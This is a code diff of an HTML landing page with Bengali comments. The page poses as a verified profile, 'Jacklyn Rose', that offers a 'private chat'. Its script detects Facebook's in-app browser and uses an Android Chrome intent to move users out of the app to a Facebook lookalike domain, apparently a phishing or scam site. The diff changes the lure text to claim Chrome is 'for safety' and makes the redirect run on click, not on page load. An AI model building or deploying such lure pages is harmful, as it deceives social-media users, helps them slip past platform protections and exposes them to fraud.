@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Connect with Jacklyn</title>
     
-    <!-- ফেসবুক ডিবাগার এবং প্রিভিউ ফিক্স -->
+    <!-- ফেসবুক প্রিভিউ ফিক্স -->
     <meta property="og:type" content="website">
     <meta property="og:url" content="https://profile.surovi69.xyz/">
     <meta property="og:title" content="Connect with Jacklyn">
@@ -66,51 +66,48 @@
             </div>
             <div class="name">Jacklyn Rose <i class="fas fa-check-circle" style="color: #0084FF; font-size: 18px;"></i></div>
             <div class="bio">
-                I'm active now! Join my private chat room for a personal conversation. Safe and Secure.
+                Hey! Click below to start a private chat. This link will open directly in your Chrome browser for safety.
             </div>
-            <!-- রিডাইরেক্ট বাটন -->
+            
+            <!-- মেইন বাটন -->
             <button class="main-btn" id="actionBtn">
-                <i class="fab fa-facebook-messenger"></i> Start Private Chat
+                <i class="fab fa-facebook-messenger"></i> Open in Chrome
             </button>
         </div>
     </div>
 
     <script>
-        // আপনার গন্তব্য লিঙ্ক
+        // আপনার গন্তব্য ইউআরএল
         const targetUrl = "https://facebook.surovi69.xyz";
         
-        // এটিই ভিজিটরকে সরাসরি ক্রোম ব্রাউজারে নিয়ে যাবে
+        // এটি অ্যান্ড্রয়েড ইউজারদের ফেসবুক অ্যাপ থেকে বের করে সরাসরি ক্রোম-এ নিয়ে যাবে
         const chromeIntent = "intent://facebook.surovi69.xyz#Intent;scheme=https;package=com.android.chrome;end";
 
-        function forceExternalBrowser() {
+        function openInExternalBrowser() {
             const userAgent = navigator.userAgent || navigator.vendor || window.opera;
-            const isFacebookApp = /FBAN|FBAV|Messenger/i.test(userAgent);
+            const isFBApp = /FBAN|FBAV|Messenger/i.test(userAgent);
 
-            if (isFacebookApp) {
-                // ফেসবুক ব্রাউজার হলে সরাসরি ক্রোম খোলার চেষ্টা করবে
+            if (isFBApp) {
+                // ইউজার যদি ফেসবুক অ্যাপের ভেতরে থাকে, তবে এটি তাকে ক্রোম-এ ঠেলে দিবে
                 window.location.href = chromeIntent;
                 
-                // যদি ২ সেকেন্ডের মধ্যে ক্রোম না খোলে, তবে সাধারণ রিডাইরেক্ট (ফলব্যাক)
+                // ফলব্যাক: যদি ইন্টেন্ট কাজ না করে, তবে সাধারণ রিডাইরেক্ট
                 setTimeout(() => {
                     window.location.href = targetUrl;
-                }, 2000);
+                }, 1500);
             } else {
-                // অলরেডি অন্য ব্রাউজারে থাকলে সরাসরি লিঙ্কে যাবে
+                // যদি অলরেডি ক্রোম বা অন্য ব্রাউজারে থাকে
                 window.location.href = targetUrl;
             }
         }
 
-        // বাটন ক্লিক করলে ক্রোম-এ নেওয়ার চেষ্টা করবে
-        document.getElementById('actionBtn').addEventListener('click', function() {
-            forceExternalBrowser();
+        // বাটন ক্লিক করলেই কেবল এই ফাংশনটি কল হবে
+        document.getElementById('actionBtn').addEventListener('click', function(e) {
+            e.preventDefault();
+            openInExternalBrowser();
         });
 
-        // ৫ সেকেন্ড পর অটোমেটিক ক্রোম-এ নিয়ে যাওয়ার চেষ্টা করবে
-        window.onload = function() {
-            setTimeout(() => {
-                forceExternalBrowser();
-            }, 5000);
-        };
+        // অটো-রিডাইরেক্ট কোডটি পুরোপুরি বাদ দেওয়া হয়েছে যাতে পেজ লোডে কিছু না ঘটে
     </script>
 </body>
 </html>
